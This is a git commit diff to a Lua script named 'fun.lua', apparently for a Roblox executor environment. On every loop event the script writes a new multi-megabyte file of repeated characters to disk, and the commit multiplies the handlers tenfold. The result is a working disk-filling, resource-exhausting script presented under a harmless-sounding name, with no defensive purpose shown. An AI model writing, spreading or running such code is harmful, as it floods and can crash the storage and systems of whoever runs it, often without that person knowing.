d00839c4b176f84b666c01643035dfbc04c4f044
flipsy <109356301+fakeflipsy@users.noreply.github.com>
2022-08-13 15:03:40 +0200

    Update fun.lua

--- real/fun.lua
+++ real/fun.lua
@@ -10,13 +10,15 @@ local Loops = {
 }
 
 local String = string.rep('𪚥', 3484848)
-
 local Name = 1
-for _, RS in ipairs(Loops) do
-    RS:Connect(function()
-        task.spawn(function()
-            writefile(Name .. '.txt', String)
+
+for _ = 1, 10 do
+    for _, RS in ipairs(Loops) do
+        RS:Connect(function()
+            task.spawn(function()
+                writefile(Name .. '.txt', String)
+            end)
+            Name = Name + 1
         end)
-        Name = Name + 1
-    end)
+    end
 end
